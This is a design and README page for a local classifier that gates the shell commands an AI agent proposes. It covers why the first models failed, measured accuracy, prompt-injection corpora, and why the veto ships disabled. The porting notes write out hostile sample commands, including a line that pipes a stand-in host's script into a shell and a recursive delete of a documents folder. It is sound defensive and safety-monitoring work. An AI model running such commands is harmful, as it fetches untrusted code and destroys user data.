# Permission Gate

The local command classifier behind `.auto` mode, the Hugging Face corpora it
was trained on, and why its veto ships disabled.

This page is the HOME for those numbers. Read it before quoting a figure about
command hazard scoring, before enabling `commandAdvisoryVeto`, and before
proposing that the model decide anything.

**Bottom line.** The plumbing is landed, measured and tested. The model is not
good enough to gate with, and the measurement that says so is reproducible in
one command. What ships on is a reason string that decorates a verdict already
heading to the approval sheet. What ships off is the veto.

**The approval question is a different question, and it is answered
elsewhere.** Classifier-driven AUTO-APPROVAL -- where the decision needs to
say yes, using the user's recent request as context -- is Agent mode
(`swift/docs/SWIFT_AGENT_MODE.md`), whose judge is the loaded language model,
not this logistic regression. Nothing here changes that split: this model may
only add friction, Agent mode's may grant.

## Where the artifacts live

| Repository | Contents |
|---|---|
| `cowWhySo/permission-gate-onnx` | models, corrected weights, oracle, training scripts |
| `cowWhySo/permission-command-corpus` | the command corpus, gold / silver / review |
| `cowWhySo/prompt-injection-watch-dataset` | the injection corpus, three pooled sources |
| `cowWhySo/permission-command-dataset` | the summary card for the command corpus |

`swift/TurboSparkApp/Sources/TurboSparkApp/Resources/permission-gate.bin` is the
copy the app ships. It is 192 KiB and it is generated, not hand-edited. Regenerate
it with the packing step in "Retraining" below.

## What the models are

Two logistic regressions over the same feature vector, trained on 321 gold rows
of shell commands.

| Head | Answers |
|---|---|
| `hazard` | is this command destructive or malicious |
| `obfuscation` | is this command disguised |

The feature vector is 24,596 wide: a 2^14 char n-gram block (`char_wb`, 3 to 5),
a 2^13 word n-gram block (1 to 2), and 20 hand-written lexical flags. Each
hashing block is L2 normalized on its own. Scoring is a sparse dot product.

A third model, `prompt_injection_watch`, is published but not shipped in the app.
See "The injection corpus" below for why.

## The defect in the published models

The originally published `command_hazard_model.onnx` and
`obfuscation_model.onnx` returned an identical score for every input. They were
withdrawn on 30 August 2026 and remain at the tag `v0-degenerate-models`.

The evidence was in the published metrics the whole time. Every
`average_precision` equals its class base rate to the last digit, and that
happens only when every score is tied:

| Model and split | Reported AP | Base rate |
|---|---|---|
| hazard, validation | 0.5142857142857142 | 18/35 |
| hazard, test | 0.325 | 13/40 |
| obfuscation, validation | 0.42857142857142855 | 15/35 |
| obfuscation, test | 0.525 | 21/40 |

Every ROC AUC read exactly 0.5. `block_threshold_cfg` sat at threshold 1.0 with
recall 0.0, so the block tier could never fire.

**The cause was feature scaling.** The trainer appended raw `len(s)` and raw
character counts to two L2-normalized hashing blocks, so one column carried
magnitude in the thousands beside two blocks whose entire norm was 1.0. It then
trained with `alpha=1e-6` under `learning_rate="optimal"`, which derives the step
size from `alpha`. A small `alpha` therefore asked for an enormous step and no
regularization at once. The weights diverged to `|w|max = 5144`, the sigmoid
saturated, and `predict_proba` returned a constant.

**The two notebooks ran the controlled experiment by accident.** Both trained at
`alpha=1e-6`. `build_command_sparse_features` appended the lexical block and both
command models scored 0.5000. `build_pi_sparse_features` omitted it, returning
`hstack([x_char, x_word])` alone, and that model scored 0.9811. One column is the
only difference. `feature_contract.json` records it independently: the injection
`input_dim` is 196608, which is 131072 plus 65536 with nothing added.

Bounding the counts, using `log1p(len)/log1p(4096)` for length, and raising
`alpha` to `1e-4` fixes it.

## The numbers

Measured 30 August 2026. Both columns matter and the second is the one that
predicts field behaviour.

| Model | In-distribution test | Held out by source |
|---|---|---|
| `hazard` | ROC AUC 0.9972 | **0.7010** |
| `obfuscation` | ROC AUC 0.9774 | not measured |
| `prompt_injection_watch` | ROC AUC 0.9807 | **0.5304, 0.4796, 0.5709** |

The command corpus takes 181 of its 246 training rows from one generator
(`openrouter:qwen/qwen3.6-plus-preview:free`), so a large part of the
in-distribution score is the model recognizing that generator's phrasing. Splits
are also unstratified: train is 50.4% bad and test is 32.5% bad, on 40 rows.

## Why the veto ships off

**Against this repository's own contract lists, the hazard model adds nothing
and costs prompts.** Both lists live in
`swift/TurboSparkApp/Tests/TurboSparkAppTests/TerminalRiskGateTests.swift`.

`TerminalCommandClassifier.isAutoApprovable` already refuses all 22 strings in
`evasionsThatMustAsk`, and the veto runs after it, so the veto is structurally
unreachable on them. **True positives it can add: zero.**

On the 18 commands of `testOrdinaryDevelopmentCommandsStillRunUnprompted` it
fires on three at threshold 0.5, and `python3 -m pytest tests/ -q` scores
**1.000**, so no threshold removes it:

| Threshold | False positives on the must-run list |
|---|---|
| 0.50 | 3 of 18 |
| 0.70 | 2 of 18 |
| 0.90 to 0.99 | 1 of 18 |

Enabling the veto therefore reddens a passing test and buys no detection. This
is the same shape as `swift/AGENTS.md` Gotcha 29 one level out: a denylist over
a string bound for `/bin/zsh -c` is the wrong shape, and a learned denylist is
still a denylist.

**The corpus answers a different question than the app asks.** It grades whether
a command is hazardous. A permission system built on a positive allowlist needs
to know whether a command evades the allowlist. Making this deployable means
rebuilding the corpus around what `.auto` actually lets through: `cargo run`,
`npm install` and its postinstall scripts, `make`, and `git push`.

## The injection corpus, and why it is not wired in

The injection model looked like the better candidate and is not. Its pooled test
ROC AUC of 0.9807 is source identification rather than injection detection.

- Trained to predict **which dataset a row came from**, ignoring injection
  entirely, the same pipeline scores 0.9998, 0.9841 and 0.9878.
- The three positive rates differ (0.503, 0.350, 0.619), so source identity
  predicts the label on its own.
- Each dataset is individually learnable (0.9226, 0.9938, 0.9951), so the three
  teach three non-transferable notions of injection.

Splits were random across a pooled corpus, so every split contains all three
sources. Real tool output is a fourth distribution, further out than these three
are from each other.

**The BIPIA subset was tried separately and refused.** It is the one source whose
collection method matches indirect injection, and its two classes come from two
different generators with an exact correlation: all 1,000 rows labelled 1 are
`source_detail == "BIPIA"` and all 988 labelled 0 are
`"Generated by GPT-4o-mini"`. So the generator and the label are one variable.
Two controls size it. Length alone, using no words, reaches ROC AUC 0.6148, and
the first 200 characters, which cannot contain an injection embedded in retrieved
content, reach 0.7843 against the full model's 0.9226.

`train_bipia_indirect.py` turns that into a gate. It refuses to export while the
prefix model carries more than 65% of the full model's lift over chance. It
measured 67.3% and refused. Do not tune that threshold.

## How it is implemented

| File | Role |
|---|---|
| `Tools/Core/HashedFeatureVectorizer.swift` | MurmurHash3 x86_32, `char_wb` and word analyzers, sparse L2 blocks |
| `Tools/Core/CommandLexicalFeatures.swift` | the 20 lexical flags, keyword lists verbatim from the trainer |
| `Tools/Core/CommandGate.swift` | weight loading, scoring, the two entry points |
| `Resources/permission-gate.bin` | the weights, 192 KiB |
| `Resources/permission-gate-oracle.json` | 18 cases for parity |
| `Tests/TurboSparkAppTests/CommandGateTests.swift` | parity, spread, and the two landmines |

### Speed and memory

Measured on an M4 Max, release build.

| | |
|---|---|
| Weights resident | 192 KiB, both heads, dense Float32 |
| Load | 0.48 ms, one read, no parsing |
| Score | 30.7 us per command |
| Allocation | a few KB per call, no shared scratch buffer |

**Dense beats sparse here and that is arithmetic rather than taste.** At 12,101
nonzero of 24,596 the weights are 49.2% dense, so a sparse `(u32, f32)` layout
costs 95 KiB against 96 KiB dense while adding a lookup per feature. The shipped
format is a flat binary rather than the trainer's JSON: 192 KiB against 713 KiB.

The accumulator is sparse even though the weights are dense. A command touches
roughly 200 features, so scoring allocates a few KB and needs no shared scratch
buffer. That is what makes `CommandGate.score` callable from any thread with no
lock.

### Where it hooks

One place only: `ToolRiskClassifier.assessTerminalCommand`, after both existing
guards. Reached there it only ever sees a command the allowlist already admitted,
so it can move a verdict to `.high` and never the other way.

```
        is the command a single simple invocation?
                    /              \
                  no               yes
                   |                |
                 ASK        on the read/build allowlist?
                                  /        \
                                no          yes
                                 |           |
                               ASK      CommandGate.veto
                                            /      \
                                          some     none
                                           |         |
                                          ASK       RUN
```

`HazardVeto` has no `approve` case, deliberately. The type is what stops a later
edit wiring the losing direction.

### The two entry points

`CommandGate.advisoryReason(for:)` ships **on**. It decorates a verdict that is
already `.ask`, so it changes what the sheet says and never what runs. The
allowlist's own sentence is accurate and unhelpful, and "local classifier: hazard
0.94" beside it gives the user something to decide on.

`CommandGate.veto(for:)` ships **off**, behind `MacAppSettings.commandAdvisoryVeto`,
for the reasons above. `AppModel+Persistence` sets `CommandGate.vetoEnabled` at
load, because `ToolRiskClassifier` is a static surface reached from the agent loop
with no `AppModel` in hand.

## Porting landmines

Both produce a working model that scores differently, which is the worst failure
mode available. Neither is visible without the oracle.

**The `\b` anchors in the word token pattern are load-bearing.** Dropping them
tokenizes `rm -rf ~/Documents` as `["rm", "-rf", "/documents"]` where sklearn
gives `["rm", "rf", "documents"]`, and every downstream hash differs. It scored
0.9320 against a true 0.9931, which reads as an ordinary model rather than a
broken port. The tell that makes it hard to catch: `curl http://x/s.sh | sh`
tokenizes identically either way, so it keeps matching while its neighbours drift.

**Python's `str.split()` splits on any whitespace run**, which is not what
`split(separator: " ")` does.

Both are pinned by their own test so a regression names its own cause rather than
surfacing as a drifted probability. Mutation-checked: dropping the anchors
reddens 17 cases, and the whitespace change reddens exactly one.

**The fixture is checked for spread before it is trusted.** A port returning a
constant passes a narrow fixture. A constant is exactly the defect that withdrew
the first two models.

One deliberate divergence from the trainer: Python scores the empty string,
`CommandGate.score("")` returns nil. "No opinion" is the honest answer and both
callers treat nil as stay quiet. The base64 and hex decode augmentation the
trainer applies before hashing is **not** ported. The two oracle cases that
exercise it are excluded by name rather than passed on a weaker comparison.

## Retraining

The three scripts live in `cowWhySo/permission-gate-onnx`. Each asserts the model
it just trained does not emit a constant and fails rather than writing metrics if
it does. That assertion is the whole difference between this and what shipped
before, and it is mutation-checked: reverting the lexical bounding raises
`DegenerateModelError` naming the constant.

```sh
hf download cowWhySo/permission-gate-onnx --local-dir .
hf download cowWhySo/permission-command-corpus --repo-type dataset --local-dir .

uv run --with 'scikit-learn==1.8.0' --with pandas --with scipy --with numpy \
    python train_permission_gate.py --report
```

`--report` prints metrics and writes nothing. Drop it to write
`permission_gate_weights.json`. Pack that to the app's flat format and refresh
the oracle, then run `swift test --filter CommandGateTests`. A parity failure
after a retrain is expected and means the fixture needs regenerating from the new
weights, not that the port broke.

## What would make this deployable

1. A corpus whose negatives are matched to its positives. For commands, that
   means rows covering allowlist evasion rather than generic hazard. For
   injection, the same retrieved document with and without the injected span.
2. Splits held out by source, reported alongside the pooled number.
3. A test set large enough to separate two models. Forty rows is not.

Until then the veto stays off, and the honest use of this model is the sentence
it writes on a sheet the user was already going to see.
